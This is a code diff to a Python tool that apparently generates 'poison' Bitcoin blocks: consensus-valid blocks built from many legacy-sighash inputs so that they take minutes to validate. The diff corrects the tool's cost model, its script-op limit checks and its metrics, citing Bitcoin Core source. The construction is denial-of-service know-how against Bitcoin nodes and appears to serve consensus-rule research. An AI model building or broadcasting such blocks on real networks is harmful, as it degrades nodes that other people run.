@@ -23,10 +23,14 @@ This decouples the two cost drivers:
   * ``sigops_per_input`` (K) is bounded by the prep blocks' per-block sigop cap
     (each UTXO's scriptPubKey adds K sigops to its prep block).
 
-For legacy (pre-SegWit) signature hashing, every ``CHECKSIG`` re-hashes the whole
-transaction (with the spent scriptPubKey as scriptCode). So the validation cost is
-roughly ``O(N^2 * K)`` hashing work, which is how the attack reaches minutes on a
-single consensus-valid block.
+For legacy (pre-SegWit) signature hashing, the spent ``scriptPubKey`` is used as
+the ``scriptCode`` for the sighash. The cost model is described precisely in
+:func:`PoisonBlockGenerator._metrics`; in short, Bitcoin Core v31.1.0 serializes
+and double-SHA256s each input's O(N)-sized preimage once (the per-input
+``SigHashCache`` collapses repeated identical ``CHECKSIG``s within an input), so
+serialization/hashing is O(N^2), while each ``CHECKSIG`` still performs a fresh
+ECDSA verification (the signature cache is not populated during block
+connection), so signature verification is O(N*K).
 
 The builder is optimized: it uses one shared key, computes legacy sighash
 preimages with C-speed bytes splicing, and signs with coincurve (C-backed
@@ -76,9 +80,12 @@ BIP54_MAX_TX_LEGACY_SIGOPS = 2500
 #: unspendable and its output is NOT stored in the UTXO set, so a poison UTXO's
 #: scriptPubKey (the spent scriptCode) must stay at or below this size.
 MAX_SCRIPT_SIZE = 10000
-#: Consensus max non-push operations per script (scriptSig + scriptPubKey).
-#: Each CHECKSIG/CHECKSIGVERIFY/DUP counts; our DUP/CHECKSIGVERIFY pattern uses
-#: two non-push ops per CHECKSIG, so K is capped at (MAX_OPS_PER_SCRIPT+1)/2.
+#: Consensus max non-push operations per *single* script (interpreter.cpp
+#: enforces it with a fresh nOpCount=0 for each EvalScript call). The scriptSig
+#: and scriptPubKey are evaluated in separate EvalScript calls, so each gets its
+#: own 201-op budget; it is NOT a combined budget. Our DUP/CHECKSIGVERIFY pattern
+#: contributes 2K-1 non-push ops to the scriptPubKey, so K is capped at
+#: (MAX_OPS_PER_SCRIPT+1)/2.
 MAX_OPS_PER_SCRIPT = 201
 
 
@@ -163,11 +170,14 @@ class ConstructionConfig:
                 f"MAX_SCRIPT_SIZE ({MAX_SCRIPT_SIZE}); the output would be unspendable. "
                 f"Maximum is {MAX_SCRIPT_SIZE // 36} CHECKSIG ops."
             )
-        # Each CHECKSIG in the DUP/CHECKSIGVERIFY pattern costs two non-push ops.
+        # Each CHECKSIG in the DUP/CHECKSIGVERIFY pattern contributes two non-push
+        # ops (one OP_DUP plus one CHECKSIG/CHECKSIGVERIFY) to the scriptPubKey's
+        # own 201-op budget. MAX_OPS_PER_SCRIPT applies per script, not to the
+        # combined scriptSig+scriptPubKey.
         if 2 * self.sigops_per_input - 1 > MAX_OPS_PER_SCRIPT:
             raise SafetyError(
                 f"sigops_per_input={self.sigops_per_input} would exceed "
-                f"MAX_OPS_PER_SCRIPT ({MAX_OPS_PER_SCRIPT}) at script execution; "
+                f"MAX_OPS_PER_SCRIPT ({MAX_OPS_PER_SCRIPT}) in the scriptPubKey; "
                 f"the block would be rejected. Maximum for this construction is "
                 f"{(MAX_OPS_PER_SCRIPT + 1) // 2}."
             )
@@ -314,6 +324,9 @@ class PoisonBlockGenerator:
         self.fund_script = key_to_p2pk_script(self.pub_bytes)
         # One shared scriptPubKey for every poison UTXO (same public key).
         self.poison_spk = poison_script_pubkey(self.pub_bytes, cfg.sigops_per_input)
+        # Populated by generate(); initialized so metrics are callable standalone.
+        self.prep_transactions = []
+        self.prep_blocks = []
 
     # -- helpers ----------------------------------------------------------- #
     def _init_clock(self):
@@ -449,30 +462,64 @@ class PoisonBlockGenerator:
         return tx
 
     # -- metrics ----------------------------------------------------------- #
+    #
+    # Cost model (v31.1.0, verified against source and by measurement):
+    #
+    #  * Each input serializes + double-SHA256s its O(N)-sized legacy sighash
+    #    preimage ONCE. The per-input SigHashCache (interpreter.cpp:1582) caches
+    #    the SHA-256 midstate keyed by (hashType, scriptCode), so the K-1
+    #    repeated CHECKSIGs inside the same input reuse the midstate and do NOT
+    #    re-serialize or re-hash the transaction. -> serialization/hashing O(N^2).
+    #
+    #  * Each CHECKSIG still performs a fresh ECDSA verification, because the
+    #    signature cache is consulted but NOT populated during block connection
+    #    (validation.cpp:2584, cacheSigStore=fJustCheck=false). -> ECDSA O(N*K).
+    #
+    #  * script interpreter stack/loop overhead is O(N*K) but cheap.
+    #
     def _metrics(self, poison_tx: CTransaction, n_prep_blocks: int) -> dict:
         cfg = self.cfg
         N, K = cfg.num_utxos, cfg.sigops_per_input
         sizes = self._preimage_sizes or []
 
         total_sigops = N * K
-        preimage_cache_aware = sum(sizes)
-        preimage_no_cache = sum(sz * K for sz in sizes)
+        # Actual serialization performed by Core v31.1.0 during validation: each
+        # of the N inputs serializes its preimage once (SigHashCache collapses
+        # the K-1 repeated CHECKSIGs within an input). Independent of K.
+        sighash_serialized = sum(sizes)
+        # Each preimage is fed through SHA-256 twice (double-SHA256).
+        sighash_double_sha256 = 2 * sighash_serialized
+        # Hypothetical serialization if the per-input midstate cache did not
+        # exist (e.g. older implementations / the python test framework's
+        # LegacySignatureHash). This does NOT describe v31.1.0 block validation.
+        no_cache_serialized = sum(sz * K for sz in sizes)
+        # Every CHECKSIG does a fresh ECDSA verification during block connection.
+        ecdsa_verifies = total_sigops
 
         tx_bytes = len(poison_tx.serialize_without_witness())
-        return {
+        m = {
             "num_utxos": N,
             "sigops_per_input": K,
             "num_prep_blocks": n_prep_blocks,
             "num_prep_transactions": len(self.prep_transactions),
             "total_legacy_sigops_bip54": total_sigops,
+            "executed_checksig_count": total_sigops,
+            "ecdsa_verify_count": ecdsa_verifies,
             "poison_tx_vin_count": len(poison_tx.vin),
             "poison_tx_vout_count": len(poison_tx.vout),
             "poison_tx_size_bytes": tx_bytes,
             "poison_tx_weight": _weight(poison_tx),
-            "expected_sighash_preimage_bytes": preimage_cache_aware,
-            "theoretical_sighash_preimage_bytes_no_cache": preimage_no_cache,
-            "per_input_preimage_bytes": preimage_cache_aware / N if N else 0,
+            # Measured-by-construction quantities (what Core actually does).
+            "sighash_serialization_bytes": sighash_serialized,
+            "sighash_double_sha256_bytes": sighash_double_sha256,
+            "per_input_preimage_bytes": sighash_serialized / N if N else 0,
+            # Hypothetical no-cache serialization (NOT v31.1.0 behavior).
+            "no_cache_sighash_serialization_bytes": no_cache_serialized,
+            # Deprecated aliases (kept for compatibility; see RESEARCH note).
+            "expected_sighash_preimage_bytes": sighash_serialized,
+            "theoretical_sighash_preimage_bytes_no_cache": no_cache_serialized,
         }
+        return m
 
 
 def _weight(tx: CTransaction) -> int:
